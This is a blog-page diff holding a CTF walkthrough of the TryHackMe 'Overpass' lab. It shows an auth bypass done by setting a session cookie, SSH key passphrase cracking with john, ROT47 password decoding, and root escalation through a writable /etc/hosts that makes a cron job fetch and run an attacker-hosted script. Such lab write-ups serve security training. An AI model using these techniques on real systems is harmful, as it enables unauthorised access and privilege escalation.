@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Saharsh Agrawal</title><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Overpass WalkThrough | Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Overpass WalkThrough" />
+<meta name="author" content="GitHub User" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Overpass https://tryhackme.com/room/overpass Open ports: - 22: SSH - 80: HTTP ![ports](/images/overpass/ports.png)" />
+<meta property="og:description" content="Overpass https://tryhackme.com/room/overpass Open ports: - 22: SSH - 80: HTTP ![ports](/images/overpass/ports.png)" />
+<meta property="og:site_name" content="Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-05-15T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Overpass WalkThrough" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2021-05-15T00:00:00+00:00","datePublished":"2021-05-15T00:00:00+00:00","description":"Overpass https://tryhackme.com/room/overpass Open ports: - 22: SSH - 80: HTTP ![ports](/images/overpass/ports.png)","headline":"Overpass WalkThrough","mainEntityOfPage":{"@type":"WebPage","@id":"/CTF/overpass"},"url":"/CTF/overpass"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/icon.jpg" /><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="Blog" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Home<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/saharshtapi" target="_blank"><i class="fab fa-twitter-square"></i></a><a class="color-blue-hover" href="https://www.linkedin.com/in/saharsh-agrawal-146b991b4/" target="_blank"><i class="fab fa-linkedin-in"></i></a><a class="color-purple-hover" href="https://github.com/saharshtapi" target="_blank"><i class="fab fa-github-square"></i></a>
+        <a class="color--hover" href="" target="_blank"><i class="fas fa-"></i></a>
+
+    </span>
+    <br>
+  </div>
+
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <h1 id="overpass">Overpass</h1>
+<p><img src="/images/overpass/front.png" alt="front" />
+<a href="https://tryhackme.com/room/overpass">https://tryhackme.com/room/overpass</a></p>
+
+<h2 id="open-ports">Open ports:</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- 22: SSH
+- 80: HTTP ![ports](/images/overpass/ports.png)
+</code></pre></div></div>
+
+<h2 id="port-80">Port 80:</h2>
+<ul>
+  <li>starting Dirbuster:
+    <ul>
+      <li>found /admin
+        <ul>
+          <li>On futhur inspection found the response login.js code</li>
+          <li>On undserstating the code and simply changing the <em>cookies.set</em>
+            <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nx">Cookies</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">"</span><span class="s2">SessionToken</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Done</span><span class="dl">"</span><span class="p">);</span>
+</code></pre></div>            </div>
+            <p><img src="/images/overpass/cookieSet.png" alt="cookie" /></p>
+          </li>
+          <li>Now on reloading the page:
+  <img src="/images/overpass/onreload.png" alt="reload" /></li>
+          <li>we find the <strong>ssh key</strong> and save it on out pc.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="port-22">Port 22:</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod 600 ssh_key
+</code></pre></div></div>
+<p><strong>Username:</strong> James</p>
+<ul>
+  <li>while logging in it is asking for passphrase</li>
+  <li>So, <strong>ssh2john</strong>
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">john</span><span class="o">/</span><span class="n">ssh2john</span><span class="p">.</span><span class="n">py</span> <span class="n">ssh_key</span> <span class="o">&gt;</span> <span class="nb">hash</span><span class="p">.</span><span class="n">txt</span>
+ <span class="n">john</span> <span class="o">--</span><span class="n">wordlist</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlist</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span> <span class="o">--</span><span class="nb">format</span><span class="o">=</span><span class="n">SSH</span> <span class="nb">hash</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div>    </div>
+    <p><img src="/images/overpass/cracked.png" alt="cracked" /></p>
+  </li>
+  <li>found the passphrase: <strong>james13</strong></li>
+</ul>
+
+<h3 id="user-flag">User Flag:</h3>
+<p><img src="/images/overpass/uflag.png" alt="uflag" /></p>
+
+<h2 id="priviledge-escalation">Priviledge Escalation”</h2>
+<ul>
+  <li>on Looking at the files in out present dir:
+    <ul>
+      <li>found .overpass file with encrypted passwd
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ,LQ?2&gt;6QiQ$JDE6&gt;Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
+</code></pre></div>        </div>
+      </li>
+      <li>which encrytion is this?</li>
+      <li>Going to https://www.dcode.fr/cipher-identifier 
+  <img src="/images/overpass/efound.png" alt="efound" /></li>
+      <li>So it is likely to be ROT47</li>
+      <li>After decoding:
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  [{"name":"System","pass":"saydrawnlyingpicture"}]
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+  <li>Uploading lineum.py….</li>
+  <li>[+]Starting linpeas.sh</li>
+  <li><strong>under crontab section found</strong>
+<img src="/images/overpass/cron.png" alt="cron" /></li>
+  <li><strong>Found /etc/hosts</strong> writable
+    <ul>
+      <li>change the overpass.thm ip to our <ip></ip></li>
+      <li>create dir <code class="language-plaintext highlighter-rouge">mkdir -p downloads/src/</code></li>
+      <li>create a <code class="language-plaintext highlighter-rouge">buildscript.sh</code> inside src folder</li>
+      <li>nano bashscript.sh
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  cat /root/root.txt &gt;&gt; /tmp/flag.txt
+</code></pre></div>        </div>
+      </li>
+      <li>inside victim :
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  touch /tmp/flag.txt
+</code></pre></div>        </div>
+      </li>
+      <li>Now go to www and start
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sudo python -m SimpleHTTPServer 80
+</code></pre></div>        </div>
+      </li>
+      <li>wait for the victim to connect to your http and run the <code class="language-plaintext highlighter-rouge">bashscript.sh</code></li>
+      <li>Go to victim machine <code class="language-plaintext highlighter-rouge">cat /tmp/flag.txt</code></li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="root-flag">Root Flag:</h3>
+<p><img src="/images/overpass/root.png" alt="root" /></p>
+
+
+        <script src="https://tryhackme.com/badge/50613"></script>
+      </div>
+
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits" style="color: #fffdd0"><a href="https://github.com/saharhtapi" style="color: #fffdd0"></a>by <a href="https://github.com/saharshtapi" style="color: #fffdd0">TApI</a><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
